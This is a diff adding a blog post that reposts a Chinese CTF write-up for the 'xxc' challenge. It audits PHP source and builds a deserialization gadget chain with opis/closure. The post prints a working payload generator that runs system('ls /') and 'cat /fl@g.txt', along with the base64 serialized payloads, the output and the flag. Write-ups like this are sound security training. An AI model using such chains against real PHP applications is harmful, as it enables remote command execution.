@@ -164,6 +164,295 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-xxc" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/05/xxc/">xxc</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/10/05/xxc/" class="archive-article-date">
+  	<time datetime="2021-10-05T06:05:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-05</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>转载自qq群<code>.</code>师傅发布的md文件</p>
+<p>原题地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/36/challenges">https://buuoj.cn/match/matches/36/challenges</a></p>
+<h3 id="xxc"><a href="#xxc" class="headerlink" title="xxc"></a>xxc</h3><ul>
+<li>打开网页提示<code>一条链子</code>，使用dirmap扫描到网站源码<a target="_blank" rel="noopener" href="http://www.zip,进行代码审计./">www.zip，进行代码审计。</a></li>
+<li>index.php其中存在反序列化操作，这道题确定是一道序列化的题目：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_loader</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;./class/&#x27;</span> . (str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$class</span>) . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">&quot;_loader&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;一条链子&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>我们先来学习一下<code>_loader()</code>函数，这是一个自动加载函数，在PHP5中，当我们实例化一个未定义的类时，就会触发此函数。</p>
+</li>
+<li><p><code>spl_autoload_register(&#39;loadprint&#39;)</code>与<code>__autoload()</code>函数有异曲同工之妙，PHP碰到没有定义的类就执行<code>loadprint()</code>函数。</p>
+</li>
+<li><p>所以我们在<code>index.php</code>中可以自由的实例化存在的类。由于是反序列化的题目，我们先来看看入口点<code>__destruct()</code>和<code>__wakeup()</code>函数是否存在：</p>
+<ul>
+<li><code>\Control\State\StopHook.php</code>中发现了析构函数，调用了同类中的<code>_exit()</code>函数，其中<code>$process-&gt;stop();</code>可能会触发<code>__call()</code>函数，而<code>!$process-&gt;isRunning</code>可能会触发<code>__get()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StopHook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [<span class="string">&#x27;auto&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$states</span> = [<span class="string">&#x27;started&#x27;</span>, <span class="string">&#x27;running&#x27;</span>, <span class="string">&#x27;finished&#x27;</span>, <span class="string">&#x27;waiting&#x27;</span>, <span class="string">&#x27;fail&#x27;</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$processes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_exit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_exit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>\Faker\MyGenerator.php</code>中找到这两个函数，<code>__call()</code>函数中<code>echo $this-&gt;defaultCall;</code>一句可能会触发<code>__toString()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$defaultValue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$arg_array</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>\Method\Func\GetFile.php</code>找到<code>__toString()</code>函数，调用了同类中的<code>getFiles()</code>函数，发现函数的中调用了<code>isset()</code>函数，如果该类中不存在该属性，会触发<code>__isset()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getFiles();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;flag) <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        <span class="variable">$s</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;flag-&gt;&#123;<span class="keyword">$this</span>-&gt;value&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span> += <span class="variable">$file</span>-&gt;read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>Method\Func\GetDefault.php</code>中找到<code>__isset()</code>函数，调用了同类中的<code>popup()</code>函数，其中<code>return $s($length);</code>可能会触发<code>__invoke()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDefault</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">popup</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span>-&gt;flag != <span class="string">&quot;myTest&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>(<span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$property</span> != <span class="string">&quot;test&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;popup(<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>最后在<code>\Method\Func\GenerateFile.php</code>中找到<code>__invoke()</code>函数，且存在<code>call_user_func()</code>。没有想到在php5中是可以直接赋值在一个没有初始化的变量上的2333。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenerateFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;myGen(<span class="variable">$param</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myGen</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;buffer-&gt;read;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;source-&gt;generate, <span class="variable">$length</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>整个链子理清楚了，但是发现<code>call_user_func()</code>的第二个参数被写死了，因为<code>$this-&gt;popup(666);</code>调用的时候将<code>666</code>传入了<code>__invoke($param)</code>，最后也就作为<code>$length</code>变量传入了<code>myGen($length)</code>函数。</p>
+</li>
+<li><p>现在只能够调用类似<code>phpinfo()</code>等不需要参数的程序，并不能够rce，该怎么办呢？</p>
+<ul>
+<li>这时候我们注意到存在<code>function.php</code>，发现这个cms是基于<code>opis/closure</code>搭建的，网址：<a target="_blank" rel="noopener" href="https://github.com/opis/closure">https://github.com/opis/closure</a></li>
+<li>该项目是用来闭包类对象的，官方文档：<a target="_blank" rel="noopener" href="https://opis.io/closure/3.x/serialize.html%E3%80%82php%E4%B8%AD%E7%9A%84%E9%97%AD%E5%8C%85%E5%87%BD%E6%95%B0%EF%BC%88%E4%BB%85%E5%AF%B9php%EF%BC%89%E5%8D%B3%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%80%E8%88%AC%E6%98%AF%E6%97%A0%E6%B3%95%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%EF%BC%8C%E4%B8%80%E8%88%AC%E4%BC%9A%E6%8A%A5%E9%94%99%EF%BC%9A">https://opis.io/closure/3.x/serialize.html。php中的闭包函数（仅对php）即匿名函数，一般是无法进行序列化的，一般会报错：</a></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &#39;Exception&#39; with message &#39;Serialization of &#39;Closure&#39; is not allowed&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用这个项目，可以将闭包包装成一个<code>Opis\Closure\SerializableClosure</code>对象，然后使用标准的<code>serialize()</code>进行序列化。也可以使用<code>Opis\Closure\serialize</code>函数序列化任意对象。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:32:&quot;Opis\Closure\SerializableClosure&quot;:156:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:33:&quot;function()&#123; eval(\system(&#39;ls&#39;));&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;0000000054d6224100000000237e90a4&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>那么我们可以将匿名函数通过<code>serialize()</code>函数经过一次序列化和反序列化，这样他就能作为<code>SerializableClosure</code>对象被序列化。或者直接将<code>generate</code>变量赋值为<code>SerializableClosure</code>类。</p>
+</li>
+<li><p>payload：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">StopHook</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; processes = <span class="keyword">array</span>(<span class="keyword">new</span> \Faker\MyGenerator());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> StopHook();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MyGenerator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">defaultValue</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; defaultValue = <span class="keyword">new</span> \Method\Func\GetFile();</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetFile</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; flag = <span class="keyword">new</span> \Method\Func\GetDefault();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; value = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetDefault</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source = <span class="keyword">new</span> \Method\Func\GenerateFile();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; flag = <span class="string">&#x27;myTest&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenerateFile</span> &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls /&#x27;</span>)); &#125;;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; generate = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将php文件放在<code>/www</code>文件夹下运行，得到序列化的结果（其实在php5中赋值一个对象在一个空变量中是会警告的<code>HP Warning:  Creating default object from empty value in /var/www/1.php on line 51</code>，在php8中就直接报错了）：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxODg6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6MzU6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdscyAvJykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwMmIzZjg4ZGMwMDAwMDAwMDE5NjUyZjhjIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将作为post参数data传递，获得回显：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc f1@g.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改<code>$function = function()&#123; eval(system(&#39;cat /fl@g.txt&#39;)); &#125;;</code>，重新序列化：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxOTc6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDQ6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdjYXQgL2YxQGcudHh0JykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwNzBkY2RiODIwMDAwMDAwMGFiNmZiZTVmIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></li>
+<li><p>获得flag：</p>
+</li>
+</ul>
+<p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318190.png" alt="image-20211002021317038"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16ed60c5-d06f-4974-931b-a26b07b5618d&#125;</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/05/xxc/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
